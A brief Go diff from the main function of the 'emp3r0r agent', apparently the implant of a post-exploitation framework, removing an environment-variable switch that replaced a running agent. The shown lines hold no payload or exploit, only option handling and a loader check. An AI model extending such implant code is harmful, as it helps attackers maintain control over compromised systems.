@@ -52,11 +52,6 @@ func main() {
 	// are we running from loader.so?
 	run_from_loader := os.Getenv("LD") == "true"
 
-	// -replace specified in environment variable
-	if os.Getenv("REPLACE_AGENT") != "" {
-		replace_agent = true
-	}
-
 	// version
 	if *version {
 		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
